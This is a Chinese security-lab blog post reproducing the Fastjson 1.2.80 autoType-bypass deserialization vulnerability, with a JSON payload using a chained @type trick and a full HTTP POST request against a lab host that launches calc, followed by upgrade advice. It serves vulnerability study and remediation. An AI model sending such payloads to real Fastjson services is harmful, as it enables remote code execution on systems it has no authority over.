<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-HUDqqawNqSJxmX1poQeEA)

  

  

网安引领时代，弥天点亮未来 

  

  

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01简要描述**  

  

Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON字符串，也可以从 JSON 字符串反序列化到 JavaBean。在 Fastjson 1.2.80 及以下版本中存在反序列化漏洞，攻击者可以在特定依赖下利用此漏洞绕过默认autoType 关闭限制，从而反序列化有安全风险的类。

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBaW4o2zPjbYsIKxhNSjsPkLeBz2OOUtsiahVNiawwOBKgl5zYZXzY6L93gC8BE4nwPgLmRatoRpf7w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02影响版本**

  

FastJson ≤1.2.80

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03漏洞复现**

  

漏洞payload

```
`{` `"@type": "java.lang.Exception",` `"@type": "com.github.isafeblue.fastjson.SimpleException",` `"domain": "calc"``}`
```

下载源码启动环境，发送payload

```
`POST /addComment HTTP/1.1``Host: 10.211.55.7:8099``Accept: */*``Accept-Encoding: gzip, deflate``Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2``Content-Length: 40``Content-Type: application/json; charset=utf-8``Cookie: LOGIN_LANG=cn``Origin: http://10.211.55.7:8099``Referer: http://10.211.55.7:8099/``User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0``X-Requested-With: XMLHttpRequest``{` `"@type": "java.lang.Exception",` `"@type": "com.github.isafeblue.fastjson.SimpleException",` `"domain": "calc"``}`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBaW4o2zPjbYsIKxhNSjsPkc7D84sfLzxOJ97JIg9CoyUKZEcDHXKcIPA9Ej3DKrOAaySar8W2Cxg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

成功执行

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBaW4o2zPjbYsIKxhNSjsPkTZjQibZOmCv1keePbxYibRmpqcyibcFzxpQykbbWV08McO2nzQicLUZYMQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04修复方法**

  

1、升级至版本 FastJson 1.2.83：

https://github.com/alibaba/fastjson/releases/tag/1.2.83

2、升级到 FastJosn v2：

https://github.com/alibaba/fastjson2/releases

  

  

  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

  

知识分享完了

喜欢别忘了关注我们哦~

  

学海浩茫，

予以风动，

必降弥天之润！

  

   弥  天

安全实验室  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)